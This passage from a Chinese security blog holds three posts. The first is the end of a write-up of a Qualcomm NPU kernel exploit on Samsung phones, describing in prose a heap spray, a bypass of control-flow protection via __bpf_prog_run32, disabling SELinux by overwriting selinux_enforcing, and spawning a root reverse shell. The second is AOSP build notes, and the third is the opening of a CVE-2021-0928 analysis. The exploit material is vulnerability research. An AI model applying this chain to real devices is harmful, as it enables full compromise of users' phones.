<p>所以在<code>npu_client</code>中要控制的关键字段是队列<code>wait</code>，它是一个双链的条目列表。通过用<code>sendmsg</code>堆喷替换释放的<code>npu_client</code>，使其等待队列的条目是指向控制数据<code>stats_buf</code>的指针，然后可以在<code>stats_buf</code>的适当偏移处放置一个任意的函数并让其执行。此外，由于该函数是以 <code>wait</code> 中的 <code>curr</code> 条目作为其第一个参数执行的，根据结构，它指向 <code>stats_buf</code>，也可以控制第一个参数 <code>curr</code> 中的数据。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/fake_npu_client.png" alt="fake_npu_client"></p>
<p>由于前面已经从<code>CVE-2021-1969</code>得到了<code>host_irq_wq</code>的地址，可以用它来获得任何内核函数的地址。但是，不能将<code>func</code>设置为任意<code>ROP</code>小工具的地址。三星 KNOX 的实时内核保护（RKP）已经实现了一种控制流完整性（CFI）的检查形式，只允许函数调用点跳转到实际函数的开始。这被称为JOPP（面向跳跃的编程预防）。</p>
<blockquote>
<p>感兴趣的读者可以参考<code>Alexandre Adamski</code>的 <a target="_blank" rel="noopener" href="https://blog.longterm.io/samsung_rkp.html"><strong>A Samsung RKP Compendium</strong></a>和<code>Dong-Hoon</code>的<a target="_blank" rel="noopener" href="http://www.powerofcommunity.net/poc2019/x82.pdf"><strong>KNOX Kernel Mitigation Byapsses</strong></a>。</p>
</blockquote>
<p>为了获得任意代码的执行，这里使用Brandon Azad在<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/12/an-ios-hacker-tries-android.html">An iOS hacker tries Android</a>中使用的<code>__bpf_prog_run32</code>函数，那就好了。正如文章中所解释的，函数<code>__bpf_prog_run32</code>可以用来调用通过第二个参数提供的 eBPF 字节码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __bpf_prog_run32(<span class="type">const</span> <span class="type">void</span> *ctx, <span class="type">const</span> bpf_insn *insn)</span><br></pre></td></tr></table></figure>

<p>为了使用<code> __bpf_prog_run32</code>，还需要另一个小工具，将第一个参数的控制权转移到第二个参数上。像这样的小工具其实并不难找，因为在Linux内核中，特别是在设备驱动代码中，经常可以看到下面这样的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="keyword">struct</span> type_a* input)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">type_b</span>* <span class="title">priv</span> =</span> input-&gt;private;</span><br><span class="line">  <span class="keyword">if</span> (priv-&gt;ops-&gt;func) &#123;</span><br><span class="line">    priv-&gt;ops-&gt;func(priv, priv-&gt;some_field1, ...);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中一个例子是<code>ion_buffer_kmap_put</code>（它实际上是内联的，所以在实际利用中使用了调用者<code>ion_dma_buf_vunmap</code>，但这是一个小技术细节）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ion_buffer_kmap_put</span><span class="params">(<span class="keyword">struct</span> ion_buffer *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (!buffer-&gt;kmap_cnt) &#123;</span><br><span class="line">		buffer-&gt;heap-&gt;ops-&gt;unmap_kernel(buffer-&gt;heap, buffer);   <span class="comment">//&lt;-------- 1.</span></span><br><span class="line">		buffer-&gt;vaddr = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过在假条目中使用<code>ion_buffer_kmap_put</code>作为<code>func</code>，在假缓冲区中使用<code>__bpf_prog_run32</code>作为<code>buffer-&gt;heap-&gt;ops-&gt;unmap_kernel</code>，将能够运行任意的 eBPF 代码。更重要的是，因为这段代码是从一个<code>kworker</code>中运行的，所以它是以<code>root</code>身份运行的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root          <span class="number">17989</span>      <span class="number">2</span>       <span class="number">0</span>      <span class="number">0</span> worker_th+          <span class="number">0</span> I [kworker/<span class="number">3</span>:<span class="number">2</span>]</span><br><span class="line">root          <span class="number">17998</span>      <span class="number">2</span>       <span class="number">0</span>      <span class="number">0</span> worker_th+          <span class="number">0</span> I [kworker/<span class="number">1</span>:<span class="number">0</span>]</span><br><span class="line">root          <span class="number">17999</span>      <span class="number">2</span>       <span class="number">0</span>      <span class="number">0</span> worker_th+          <span class="number">0</span> I [kworker/<span class="number">2</span>:<span class="number">1</span>]</span><br><span class="line">root          <span class="number">18179</span>      <span class="number">2</span>       <span class="number">0</span>      <span class="number">0</span> worker_th+          <span class="number">0</span> I [kworker/u16:<span class="number">2</span>]</span><br><span class="line">root          <span class="number">18212</span>      <span class="number">2</span>       <span class="number">0</span>      <span class="number">0</span> worker_th+          <span class="number">0</span> I [kworker/<span class="number">0</span>:<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<h2 id="绕过SELinux并获取root-shell"><a href="#绕过SELinux并获取root-shell" class="headerlink" title="绕过SELinux并获取root shell"></a>绕过SELinux并获取root shell</h2><p>当<code>SELinux</code>被启用时，它可以在允许模式或强制模式下运行。当处于允许模式时，它将只审计和记录未经授权的访问，但不会阻止它们。<code>SELinux</code>的运行模式是由<code>selinux_enforcing</code>变量控制的。如果这个变量为零，那么<code>SELinux</code>将在允许模式下运行。通常，对系统安全至关重要的变量将受到内核数据保护（KDP）的保护，通过使用<code>__kdp_ro</code>或<code>__rkp_ro</code>属性将其标记为只读（这个属性表明该变量处于只读页面，其修改受到管理程序调用的保护）。然而，在测试的固件上，以及一些S系列设备的源代码上，这个变量似乎没有被保护。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//In security/selinux/hooks.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY_SELINUX_DEVELOP</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> selinux_enforcing_boot;</span><br><span class="line"><span class="type">int</span> selinux_enforcing;</span><br></pre></td></tr></table></figure>

<p>在这些设备中，配置<code>CONFIG_SECURITY_SELINUX_DEVELOP</code>被启用。从三星下载的内核源代码来看，最近的2021年6月的固件似乎也是如此（来自S21源代码），尽管较新版本的固件似乎对<code>selinux_enforcing</code>增加了保护。在对应于较新固件的源代码中（S20的G981USQS2DUH2&#x2F;G981USQS2DUI1，大约是9月的更新），<code>selinux_enforcing</code>变量被标记为<code>__kdp_ro</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//In security/selinux/hooks.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY_SELINUX_DEVELOP</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (defined CONFIG_KDP_CRED &amp;&amp; defined CONFIG_SAMSUNG_PRODUCT_SHIP)</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> selinux_enforcing_boot __kdp_ro;</span><br><span class="line"><span class="type">int</span> selinux_enforcing __kdp_ro;</span><br></pre></td></tr></table></figure>

<p>并且现在受到KNOX的保护。然而，由于这篇文章中的bug在2021年7月被修复，仍然可以通过将<code>selinux_enforcing</code>覆盖为0来禁用<code>SELinux</code>。</p>
<p>在SELinux被禁用后，可以通过内核代码执行原语调用<code>call_usermodehelper</code>函数，以生成一个反向<code>shell</code>。由于该代码是从<code>kworker</code>中调用的，所以<code>shell</code>也会有<code>root</code>用户ID。漏洞利用可以<a target="_blank" rel="noopener" href="https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Qualcomm/NPU">在此</a>找到。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">https://securitylab.github.com/research/qualcomm_npu/</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-04-23T07:09:25.000Z" title="2022/4/23 15:09:25">2022-04-23</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-04-23T11:46:49.339Z" title="2022/4/23 19:46:49">2022-04-23</time></span><span class="level-item">16 minutes read (About 2376 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/04/23/Android%E6%BA%90%E7%A0%81%E7%AC%94%E8%AE%B0/">Android源码笔记</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一下有关Android源码的相关知识。</p>
<h1 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h1><p>如下图所示，Android整体上分为5层，分别是系统应用、应用框架、系统运行库(Native C&#x2F;C++库和Android运行时)、硬件抽象层HAL以及Linux内核。</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/android-stack_2x.png" alt="android-stack_2x" style="zoom: 33%;" />

<h2 id="系统应用层"><a href="#系统应用层" class="headerlink" title="系统应用层"></a>系统应用层</h2><p>Android 随附一套用于电子邮件、短信、日历、互联网浏览和联系人等的核心应用。</p>
<h2 id="应用框架层"><a href="#应用框架层" class="headerlink" title="应用框架层"></a>应用框架层</h2><p>开发所需的java API。</p>
<p>名称	功能描述</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>Activity Manager(活动管理器)</td>
<td>管理各个应用程序生命周期以及通常的导航回退功能</td>
</tr>
<tr>
<td>Location Manager(位置管理器)</td>
<td>提供地理位置以及定位功能服务</td>
</tr>
<tr>
<td>Package Manager(包管理器)</td>
<td>管理所有安装在Android系统中的应用程序</td>
</tr>
<tr>
<td>Notification Manager(通知管理器)</td>
<td>应用程序可以在状态栏中显示自定义的提示信息</td>
</tr>
<tr>
<td>Resource Manager(资源管理器)</td>
<td>提供应用程序使用的各种非代码资源，如本地化字符串、图片、布局文件、颜色文件等</td>
</tr>
<tr>
<td>Telephony Manager(电话管理器)</td>
<td>管理所有的移动设备功能</td>
</tr>
<tr>
<td>Window Manager(窗口管理器)</td>
<td>管理所有开启的窗口程序</td>
</tr>
<tr>
<td>Content Providers(内容提供器)</td>
<td>使不同应用程序之间共享数据</td>
</tr>
<tr>
<td>View System(视图系统)</td>
<td>构建应用程序的基本组件</td>
</tr>
</tbody></table>
<h2 id="系统运行库层"><a href="#系统运行库层" class="headerlink" title="系统运行库层"></a>系统运行库层</h2><h3 id="Native-C-C-库"><a href="#Native-C-C-库" class="headerlink" title="Native C&#x2F;C++库"></a>Native C&#x2F;C++库</h3><p>如果开发的是需要 C 或 C++ 代码的应用，可以使用 <a target="_blank" rel="noopener" href="https://developer.android.com/ndk?hl=zh-cn">Android NDK</a> 直接从原生代码访问某些<a target="_blank" rel="noopener" href="https://developer.android.com/ndk/guides/stable_apis?hl=zh-cn">原生平台库</a>。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>OpenGL ES</td>
<td>3D绘图函数库</td>
</tr>
<tr>
<td>Libc</td>
<td>从BSD继承来的标准C系统函数库，专门为基于嵌入式Linux的设备定制</td>
</tr>
<tr>
<td>Media Framework</td>
<td>多媒体库，支持多种常用的音频、视频格式录制和回放</td>
</tr>
<tr>
<td>SQLite</td>
<td>轻型的关系型数据库引擎</td>
</tr>
<tr>
<td>SGL</td>
<td>底层的2D图形渲染引擎</td>
</tr>
<tr>
<td>SSL</td>
<td>安全套接层，是为网络通信提供安全及数据完整性的一种安全协议</td>
</tr>
<tr>
<td>FreeType</td>
<td>可移植的字体引擎，它提供统一的接口来访问多种字体格式文件</td>
</tr>
</tbody></table>
<h3 id="Android运行时"><a href="#Android运行时" class="headerlink" title="Android运行时"></a>Android运行时</h3><p>对于运行 Android 5.0（API 级别 21）或更高版本的设备，每个应用都在其自己的进程中运行，并且有其自己的 <a target="_blank" rel="noopener" href="https://source.android.com/devices/tech/dalvik/index.html?hl=zh-cn">Android Runtime (ART)</a> 实例。ART 编写为通过执行 DEX 文件在低内存设备上运行多个虚拟机（DEX 文件是一种专为 Android 设计的字节码格式，经过优化，使用的内存很少）。</p>
<p>ART 的部分主要功能包括：</p>
<ul>
<li>预先 (AOT) 和即时 (JIT) 编译</li>
<li>优化的垃圾回收 (GC)</li>
<li>在 Android 9（API 级别 28）及更高版本的系统中，支持将应用软件包中的 <a target="_blank" rel="noopener" href="https://developer.android.com/about/versions/pie/android-9.0?hl=zh-cn#art-aot-dex">Dalvik Executable 格式 (DEX) 文件转换为更紧凑的机器代码</a>。</li>
<li>更好的调试支持，包括专用采样分析器、详细的诊断异常和崩溃报告，并且能够设置观察点以监控特定字段</li>
</ul>
<p>在 Android 版本 5.0（API 级别 21）之前，Android Runtime 是 Dalvik。如果应用在 ART 上运行良好，那么它应该也可在 Dalvik 上运行，但<a target="_blank" rel="noopener" href="https://developer.android.com/guide/practices/verifying-apps-art?hl=zh-cn">反过来不一定</a>。</p>
<p>还有一点，在Dalvik下，应用每次运行的时候，字节码都需要通过即时编译器转换为机器码，这样会降低运行效率；而在ART 环境中，应用在第一次安装的时候&#x2F;每次重启，字节码会预先编译成机器码。</p>
<p>Android 还包含一套核心运行时库，可提供 Java API 框架所使用的 Java 编程语言中的大部分功能，包括一些 <a target="_blank" rel="noopener" href="https://developer.android.com/guide/platform/j8-jack?hl=zh-cn">Java 8 语言功能</a>。</p>
<h2 id="硬件抽象层"><a href="#硬件抽象层" class="headerlink" title="硬件抽象层"></a>硬件抽象层</h2><p><a target="_blank" rel="noopener" href="https://source.android.com/devices/architecture/hal-types?hl=zh-cn">硬件抽象层 (HAL)</a> 提供标准界面，向更高级别的 <a target="_blank" rel="noopener" href="https://developer.android.com/guide/platform?hl=zh-cn#api-framework">Java API 框架</a>显示设备硬件功能。HAL 包含多个库模块，其中每个模块都为特定类型的硬件组件实现一个界面，例如<a target="_blank" rel="noopener" href="https://source.android.com/devices/camera/index.html?hl=zh-cn">相机</a>或<a target="_blank" rel="noopener" href="https://source.android.com/devices/bluetooth.html?hl=zh-cn">蓝牙</a>模块。当框架 API 要求访问设备硬件时，Android 系统将为该硬件组件加载库模块。</p>
<h2 id="Linux内核层"><a href="#Linux内核层" class="headerlink" title="Linux内核层"></a>Linux内核层</h2><p>Android 平台的基础是 Linux 内核。例如，<a target="_blank" rel="noopener" href="https://developer.android.com/guide/platform?hl=zh-cn#art">Android Runtime (ART)</a> 依靠 Linux 内核来执行底层功能，例如线程和低层内存管理。</p>
<p>使用 Linux 内核可让 Android 利用<a target="_blank" rel="noopener" href="https://source.android.com/security/overview/kernel-security.html?hl=zh-cn">主要安全功能</a>，并且允许设备制造商为内核开发硬件驱动程序。</p>
<h1 id="源码目录结构"><a href="#源码目录结构" class="headerlink" title="源码目录结构"></a>源码目录结构</h1><p>以下是Android7的源码结构，不同版本可能有些不同。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>abi</td>
<td>应用程序二进制接口</td>
</tr>
<tr>
<td>art</td>
<td>全新的ART运行环境</td>
</tr>
<tr>
<td>bionic</td>
<td>系统C库</td>
</tr>
<tr>
<td>bootable</td>
<td>启动引导相关代码</td>
</tr>
<tr>
<td>build</td>
<td>存放系统编译规则及generic等基础开发包配置</td>
</tr>
<tr>
<td>cts</td>
<td>Android兼容性测试套件标准</td>
</tr>
<tr>
<td>dalvik</td>
<td>dalvik虚拟机</td>
</tr>
<tr>
<td>developers</td>
<td>开发者目录</td>
</tr>
<tr>
<td>development</td>
<td>应用程序开发相关</td>
</tr>
<tr>
<td>device</td>
<td>设备相关配置</td>
</tr>
<tr>
<td>docs</td>
<td>参考文档</td>
</tr>
<tr>
<td>external</td>
<td>开源模组相关文件</td>
</tr>
<tr>
<td>frameworks</td>
<td>应用程序框架，Android系统核心部分，由Java和C++编写</td>
</tr>
<tr>
<td>hardware</td>
<td>主要是硬件抽象层的代码</td>
</tr>
<tr>
<td>libcore</td>
<td>核心库相关文件</td>
</tr>
<tr>
<td>libnativehelper</td>
<td>动态库，实现JNI库的基础</td>
</tr>
<tr>
<td>ndk</td>
<td>NDK相关代码，帮助开发人员在应用程序中嵌入C&#x2F;C++代码</td>
</tr>
<tr>
<td>out</td>
<td>编译完成后代码输出在此目录</td>
</tr>
<tr>
<td>packages</td>
<td>应用程序包</td>
</tr>
<tr>
<td>pdk</td>
<td>Plug Development Kit 的缩写，本地开发套件</td>
</tr>
<tr>
<td>platform_testing</td>
<td>平台测试</td>
</tr>
<tr>
<td>prebuilts</td>
<td>x86和arm架构下预编译的一些资源</td>
</tr>
<tr>
<td>sdk</td>
<td>sdk和模拟器</td>
</tr>
<tr>
<td>system</td>
<td>底层文件系统库、应用和组件</td>
</tr>
<tr>
<td>toolchain</td>
<td>工具链文件</td>
</tr>
<tr>
<td>tools</td>
<td>工具文件</td>
</tr>
<tr>
<td>Makefile</td>
<td>全局Makefile文件，用来定义编译规则</td>
</tr>
</tbody></table>
<p>官方源码链接：</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/packages/apps/">android&#x2F;platform&#x2F;packages&#x2F;apps</a>：Android自带的app，比如Email,Camera, Music等，对于应用开发工程师主要关注的目录；</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/frameworks/base/">android&#x2F;platform&#x2F;frameworks&#x2F;base</a>： Java framework，这是framework工程师看得最多的目录；</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/frameworks/native/">android&#x2F;platform&#x2F;frameworks&#x2F;native</a>：Native framework</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/art/">android&#x2F;platform&#x2F;art</a>：Art<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:97264610%7D">虚拟机</a></p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/kernel/common/">android&#x2F;kernel&#x2F;common</a>：Android内核，这是驱动工程师最关注的模块；</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/system/core/">android&#x2F;platform&#x2F;system&#x2F;core</a> ：核心系统</p>
<p><a href="https://link.zhihu.com/?target=https://android.googlesource.com/platform/libcore/">android&#x2F;platform&#x2F;libcore</a>：平台的lib库</p>
<h1 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h1><p>参考<a target="_blank" rel="noopener" href="https://source.android.com/security/overview/kernel-security.html?hl=zh-cn">这里</a>。</p>
<h1 id="下载Android源码"><a href="#下载Android源码" class="headerlink" title="下载Android源码"></a>下载Android源码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget -c https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar <span class="comment"># 下载初始化包</span></span><br><span class="line">$ tar xf aosp-latest.tar</span><br><span class="line">$ <span class="built_in">cd</span> aosp   <span class="comment"># 解压得到的 aosp 工程目录</span></span><br><span class="line">$ repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-8.1.0_r1	</span><br><span class="line">$ repo <span class="built_in">sync</span> <span class="comment"># 正常同步一遍即可得到完整目录</span></span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash  </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;======start repo sync======&quot;</span>  </span><br><span class="line">./repo <span class="built_in">sync</span> -j4</span><br><span class="line"><span class="keyword">while</span> [ $? = 1 ]; <span class="keyword">do</span>  </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;======sync failed, re-sync again======&quot;</span>  </span><br><span class="line">        <span class="built_in">sleep</span> 3  </span><br><span class="line">        ./repo <span class="built_in">sync</span> -j4 </span><br><span class="line"><span class="keyword">done</span> </span><br></pre></td></tr></table></figure>

<h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> .repo/manifests</span><br><span class="line">git branch -a   <span class="comment">#查看所有分支</span></span><br><span class="line"></span><br><span class="line">repo init -b android-4.1.2_r1   <span class="comment"># 切换分支</span></span><br><span class="line">repo <span class="built_in">sync</span></span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h1><p>这里我要编译的是Pixel4XL，android-12.0.0_r1。</p>
<h2 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h2><p>先找到自己设备对应的<a target="_blank" rel="noopener" href="https://developers.google.com/android/drivers">驱动</a>下载下来，如果不下载驱动直接编译源码，刷机后进不去系统。这里对应的驱动如下：</p>
<table>
<thead>
<tr>
<th align="left">Hardware Component</th>
<th align="left">Company</th>
<th align="left">Download</th>
<th align="left">SHA-256 Checksum</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Vendor image</td>
<td align="left">Google</td>
<td align="left"><a target="_blank" rel="noopener" href="https://dl.google.com/dl/android/aosp/google_devices-coral-sp1a.210812.015-b15979c9.tgz">Link</a></td>
<td align="left">b456661c1b013d26fe7355db4787be0851c18b0852b41f4f25506a1884151b1e</td>
</tr>
<tr>
<td align="left">GPS, Audio, Camera, Gestures, Graphics, DRM, Video, Sensors</td>
<td align="left">Qualcomm</td>
<td align="left"><a target="_blank" rel="noopener" href="https://dl.google.com/dl/android/aosp/qcom-coral-sp1a.210812.015-2133da5b.tgz">Link</a></td>
<td align="left">85a8d48d80e89994520d6221a3e5d35c720d43898e5107b2835b0cd889799307</td>
</tr>
</tbody></table>
<p>解压上面两个压缩包到源码根目录下，然后执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar zxvf qcom-coral-sp1a.210812.015-2133da5b.tgz -C./</span><br><span class="line">tar xvf google_devices-coral-sp1a.210812.015-b15979c9.tgz</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">./extract-qcom-coral.sh</span><br><span class="line">./extract-google_devices-coral.sh</span><br></pre></td></tr></table></figure>

<p>执行完会生成vendor目录。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  aosp <span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">➜  aosp lunch</span><br><span class="line">➜  aosp make -j8</span><br></pre></td></tr></table></figure>

<h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/code/android11$ <span class="built_in">export</span> ANDROID_PRODUCT_OUT=./out/target/product/blueline</span><br><span class="line">~/code/android11$ fastboot flashall -w</span><br><span class="line">...</span><br><span class="line">File system <span class="built_in">type</span> raw not supported.</span><br><span class="line">Erasing <span class="string">&#x27;metadata&#x27;</span>                                 OKAY [  0.007s]</span><br><span class="line">Erase successful, but not automatically formatting.</span><br><span class="line">File system <span class="built_in">type</span> raw not supported.</span><br><span class="line">Rebooting                                          OKAY [  0.000s]</span><br><span class="line">Finished. Total time: 101.511s</span><br></pre></td></tr></table></figure>

<h2 id="问题1：Could-not-find-a-supported-mac-sdk（mac-sdk-版本不匹配）"><a href="#问题1：Could-not-find-a-supported-mac-sdk（mac-sdk-版本不匹配）" class="headerlink" title="问题1：Could not find a supported mac sdk（mac sdk 版本不匹配）"></a>问题1：Could not find a supported mac sdk（mac sdk 版本不匹配）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--- FAIL: TestClippy (17.28s)</span><br><span class="line">    --- FAIL: TestClippy/path= (17.00s)</span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br><span class="line">        clippy_test.go:63: <span class="string">&quot;Unsupported macOS SDK version \&quot;12.3\&quot; not in [11]&quot;</span></span><br></pre></td></tr></table></figure>

<p>下载<a target="_blank" rel="noopener" href="https://github.com/phracker/MacOSX-SDKs/releases">SDK</a>，放入<code>/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs</code>。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-04-22T13:19:31.000Z" title="2022/4/22 21:19:31">2022-04-22</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-04-22T13:20:37.938Z" title="2022/4/22 21:20:37">2022-04-22</time></span><span class="level-item">30 minutes read (About 4496 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/04/22/Android-CVE-2021-0928/">Android-CVE-2021-0928</a></p><div class="content"><blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://github.com/michalbednarski/ReparcelBug2">https://github.com/michalbednarski/ReparcelBug2</a></p>
</blockquote>
<h1 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h1><p><code>android.hardware.camera2.params.OutputConfiguration.java</code>中的 <code>writeToParcel</code>&#x2F;<code>createFromParcel</code> 不匹配导致的。</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Android 9 至 Android 11，Android 12 Developer Preview 3，在官方Android 12发布版中修复。</p>
<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><p>Android 12 Beta 2 and 3</p>
<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="Parcel"><a href="#Parcel" class="headerlink" title="Parcel"></a>Parcel</h2><p>在Android的两个<code>activity</code>之间传递对象，则这个对象必须要进行序列化，在Android中实现序列化有两种方式，一是实现<code>Serializable</code>接口，二是实现<code>Parcelable</code>接口。<code>Parcelable</code>的方式要比<code>Serializable</code>的效率要高。</p>
<p>Android上的大部分IPC都是基于一个叫<code>Parcel</code>的类。基本的<code>Parcel</code>用法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Parcel</span> <span class="variable">p</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">p.writeInt(<span class="number">1</span>);</span><br><span class="line">p.writeString(<span class="string">&quot;Hello&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>然后<code>Parcel</code>通过<code>Binder</code>将消息传递给其他进程，为了测试，可以调用<code>p.setDataPosition(0)</code>将消息设置为起始位置并开始读取。</p>
